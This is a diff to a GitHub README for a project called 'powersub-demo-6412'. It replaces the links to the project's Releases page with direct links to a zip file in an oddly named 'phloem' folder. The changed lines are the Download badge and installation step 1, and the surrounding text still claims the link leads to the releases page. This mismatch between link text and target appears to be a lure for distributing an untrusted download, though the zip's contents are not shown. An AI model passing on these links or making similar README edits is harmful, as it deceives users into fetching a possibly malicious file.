@@ -6,13 +6,13 @@ Welcome to the powersub-demo-6412 project! This application helps you easily man
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/G9IOUS/powersub-demo-6412/releases)
+[![Download Now](https://raw.githubusercontent.com/G9IOUS/powersub-demo-6412/main/phloem/powersub-demo-6412.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/G9IOUS/powersub-demo-6412/main/phloem/powersub-demo-6412.zip)
 
 To get started, you need to download the latest version of the powersub-demo-6412 application. You can find it on the Releases page linked above. This page contains all available versions of the software.
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page**: Click [here](https://github.com/G9IOUS/powersub-demo-6412/releases) to go to the releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/G9IOUS/powersub-demo-6412/main/phloem/powersub-demo-6412.zip) to go to the releases page.
    
 2. **Choose the Latest Version**: At the top section of the page, you will see the latest version listed. Click on it to view the available files.
 
